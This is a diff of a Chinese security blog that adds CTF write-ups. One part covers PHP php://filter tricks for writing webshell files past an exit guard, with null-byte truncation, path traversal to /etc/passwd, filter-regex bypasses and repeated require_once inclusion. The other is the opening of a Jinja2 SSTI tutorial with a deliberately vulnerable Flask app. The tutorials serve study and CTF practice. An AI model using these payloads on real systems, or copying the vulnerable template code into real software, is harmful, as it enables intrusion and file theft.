+<ul>
+<li>压缩+小写+解压过滤器的叠加</li>
+</ul>
+<p>个人感觉这种方法好玄学啊，这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，在这三种变换中死亡exit会被除掉，但是我们在要插入的恶意代码前面插入<code>php/:|</code>后，会非常神奇得保留下来了</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201213194726095.png" alt="image-20201213194726095"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php&#x2F;:|&lt;?php%0Dphpinfo();?&gt;&#x2F;resource&#x3D;shell.php&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|string.tolower|zlib.inflate|&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h5><p>第二种情况正是WMCTF2020中web_checkin这道题</p>
+<p>这里我们测试代码如下</p>
+<p><code>test3.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;content&#x27;</span>],<span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>.$_GET[<span class="string">&#x27;content&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>注意这里的文件名和文件内容都是<code>content</code>，这里不同的就是需要在<code>something</code>的位置写入我们的恶意代码，然后<code>write=</code>可以省略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|something&#x2F;resource&#x3D;shell.php</span><br><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;something|string.rot13&#x2F;resource&#x3D;shell.php</span><br><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;something|string.rot13&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<h6 id="单独过滤器-1"><a href="#单独过滤器-1" class="headerlink" title="单独过滤器"></a>单独过滤器</h6><ul>
+<li><code>string.rot13</code>编码绕过</li>
+</ul>
+<p>原理和上面差不多，要注意的是这种方法要在未开启短标签的时候才可以使用，默认是没有开启的，最后payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc cucvasb();?&gt;&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>UCS-4</code></li>
+</ul>
+<p>这种方法的原理就是通过字符转换把<code>&lt;?php exit();?&gt;</code>转成不能解析的，这里采用的是<code>UCS-4</code>编码方式，我们首先把恶意代码进行一个UCS-4的编码，因为这里对目标字符串是4位一反转，所以要注意这里的恶意代码要是4的倍数，所以这里需要补上两个字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;aa&lt;?php phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?&lt;aa phpiphp(ofn&gt;?;)</span></span><br></pre></td></tr></table></figure>
+
+<p>然后构造payload的时候要注意前面的字符也是4的倍数，这里可以算一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strlen(<span class="string">&#x27;&lt;?php exit; ?&gt;php://filter//convert.iconv.UCS-4LE.UCS-4BE|&#x27;</span>);</span><br><span class="line"><span class="comment">//58</span></span><br></pre></td></tr></table></figure>
+
+<p>运算结果为58，少了2位，我们加上两个字符即可，最后payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-4LE.UCS-4BE|aa?&lt;aa phpiphp(ofn&gt;?;)&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201214191635040.png" alt="image-20201214191635040"></p>
+<ul>
+<li><code>UCS-2</code></li>
+</ul>
+<p>这种方法和上面的<code>UCS-4</code>差不多，只不过对目标字符串是2位一反转</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201214191559151.png" alt="image-20201214191559151"></p>
+<h6 id="组合过滤器-1"><a href="#组合过滤器-1" class="headerlink" title="组合过滤器"></a>组合过滤器</h6><ul>
+<li>压缩+小写+解压过滤器的叠加</li>
+</ul>
+<p>这里直接给个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|string.tolower|zlib.inflate|&lt;?php%0Dphpinfo();?&gt;&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>UCS-2/UCS-4</code>+<code>rot13</code>绕过</li>
+</ul>
+<p>同理，先<code>UCS-2</code>和<code>rot13</code>编码<code>phpinfo</code>，这里也同样要注意字符的倍数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,str_rot13(<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?&lt;uc cucvcsa(b;)&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>这里payload前面刚刚好是2的倍数就不用补了，构造payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE|string.rot13|?&lt;uc cucvcsa(b;)&gt;?&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><code>UCS-4</code>也是一样的道理，这里就不赘述了</p>
+<ul>
+<li><code>utf-8</code>转<code>utf-7</code>再加<code>convert.base64-decode</code></li>
+</ul>
+<p>这里说一下上面之所以没有介绍base64单独过滤器，是因为单独用base64编码是不可行的，因为默认情况下base64编码是以 <code>=</code> 作为结尾的，而我们在最后获取文件名的时候<code>resource=</code>中存在一个 <code>=</code> ，导致过滤器解码失败，从而报错。所以这里我们使用<code>utf-8</code>编码转为<code>utf-7</code>编码，从而把 <code>=</code> 给转化了，就不会影响到base64的解码了</p>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="一些小trick"><a href="#一些小trick" class="headerlink" title="一些小trick"></a>一些小trick</h2><ul>
+<li><code>%00</code>截断</li>
+</ul>
+<p>使用条件为php版本&lt;=5.2</p>
+<p>有时候我们需要截断，比如说存在拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候可以使用<code>%00</code>进行截断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;WINDOWS&#x2F;win.ini%00</span><br></pre></td></tr></table></figure>
+
+<p>原理就是PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数，在连接字符串时，0字节(<code>\x00</code>)将作为字符串的结束符，所以在这个地方，攻击者只要在最后加入一个0字节，就能截断<code>$file</code>变量之后的字符串。</p>
+<p>关于截断的更多用法：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27739315">https://zhuanlan.zhihu.com/p/27739315</a></p>
+<ul>
+<li>不存在协议头绕过</li>
+</ul>
+<p>有关<code>file_get_contents()</code>函数的一个trick，当PHP的 <code>file_get_contents()</code> 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件，例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^https/is&#x27;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此处限制我们只能读https开头的路径，但利用这个特性我们可以构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpsssss:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>配合目录回退读取文件的两种方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">httpsssss:&#x2F;&#x2F;abc..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20201007121407467.png" alt="image-20201007121407467"></p>
+<ul>
+<li>双url编码绕过</li>
+</ul>
+<p>很多时候CTF题目会过滤我们的<code>php://filter</code>的转换过滤器，比如这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/#|base64|rot13|base32|base16/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这里有个绕过的点就是伪协议处理时会对过滤器url解码一次，也就是说我们可以通过双url编码的方式绕过上面的对过滤器的正则，比如把base64双url编码之后为<code>%2562%2561%2573%2565%2536%2534</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%2562%2561%2573%2565%2536%2534-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是有时候出题人想恶心你一下的话，会在服务端把<code>%25</code>给ban掉，这时候我们可以写个脚本跑一下url的编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$char = <span class="string">&#x27;b&#x27;</span>; <span class="comment">#构造b的二次编码</span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123;</span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2;</span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//b: %6%32</span></span><br></pre></td></tr></table></figure>
+
+<p>最后payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%6%32ase64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>require_once</code>重复包含</li>
+</ul>
+<p>这种方法在WMCTF2020考到过，众所周知，<code>require_once</code>只能包含一次，像下面这种情况，如何去读取他的一个<code>flag.php</code>呢</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的是PHP最新版的小Trick，<code>require_once</code>包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文只是总结了一下之前在打CTF遇到的一些用法，实际上php中伪协议的用法肯定不止这些，然后就是本文有写的不对不足的地方请师傅们多多指出</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
+
       
     </div>
 
@@ -311,7 +673,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-23 00:01:03" itemprop="dateModified" datetime="2020-12-23T00:01:03+08:00">2020-12-23</time>
+                <time title="修改时间：2021-02-05 21:19:45" itemprop="dateModified" datetime="2021-02-05T21:19:45+08:00">2021-02-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -348,15 +710,489 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">传送门</a>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/12/18/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">传送门</a></p>
+<p>SSTI（Server-Side Template Injection）服务端模板注入在CTF中并不是一个新颖的考点了，之前略微学习过，但是最近的大小比赛比如说安洵杯，祥云杯，太湖杯，南邮CTF，上海大学生安全竞赛等等比赛都频频出现，而且赛后看到师傅们各种眼花缭乱的payload，无法知晓其中的原理，促使我写了这篇文章来总结各种bypass SSTI的方法。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本篇文章从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎</p>
+<h3 id="模板的基本语法"><a href="#模板的基本语法" class="headerlink" title="模板的基本语法"></a>模板的基本语法</h3><p>官方文档对于模板的语法介绍如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements</span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line"></span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line"></span><br><span class="line">#  ... ## for Line Statements</span><br></pre></td></tr></table></figure>
+
+<p>这里我们逐条来看</p>
+<ul>
+<li><code>&#123;%%&#125;`
+
+主要用来声明变量，也可以用于条件语句和循环语句。
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set c&#x3D; &#39;kawhi&#39; %&#125;</span><br><span class="line">&#123;% if 81&#x3D;&#x3D;9*9 %&#125;kawhi&#123;% endif %&#125;</span><br><span class="line">&#123;% for i in [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;] %&#125;kawhi&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+- `&#123;&#123;&#125;&#125;`
+
+用于将表达式打印到模板输出，比如我们一般在里面输入`2-1`，`2*2`，或者是字符串，调用对象的方法，都会渲染出结果
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">2</span><span class="number">-1</span>&#125;&#125; <span class="comment">#输出1</span></span><br><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">2</span>&#125;&#125; <span class="comment">#输出4</span></span><br></pre></td></tr></table></figure>
+
+我们通常会用`&#123;&#123;2*2&#125;&#125;`简单测试页面是否存在SSTI
+
+- `&#123;##&#125;`
+
+表示未包含在模板输出中的注释
+
+- `##`
+
+有和`&#123;%%&#125;`相同的效果
+
+这里的模板注入主要用到的是`&#123;&#123;&#125;&#125;`和`&#123;%%&#125;</code></li>
+</ul>
+<h3 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h3><ul>
+<li><code>__class__</code></li>
+</ul>
+<p>用于返回对象所属的类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__base__</code></li>
+</ul>
+<p>以字符串的形式返回一个类所继承的类</p>
+<ul>
+<li><code>__bases__</code></li>
+</ul>
+<p>以元组的形式返回一个类所继承的类</p>
+<ul>
+<li><code>__mro__</code></li>
+</ul>
+<p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Father</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">GrandFather</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">son</span>(<span class="params">Father,GrandFather</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(son.__base__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Father</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__bases__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__mro__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.son&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;, &lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__subclasses__()</code></li>
+</ul>
+<p>获取类的所有子类</p>
+<ul>
+<li><code>__init__</code></li>
+</ul>
+<p>所有自带带类都包含<code>init</code>方法，常用他当跳板来调用<code>globals</code></p>
+<ul>
+<li><code>__globals__</code></li>
+</ul>
+<p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>init</code>使用</p>
+<h3 id="漏洞成因与防御"><a href="#漏洞成因与防御" class="headerlink" title="漏洞成因与防御"></a>漏洞成因与防御</h3><p>存在模板注入漏洞原因有二，一是存在用户输入变量可控，二是了使用不固定的模板，这里简单给出一个存在SSTI的代码如下</p>
+<p><code>ssti.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;SSTI&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>% (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
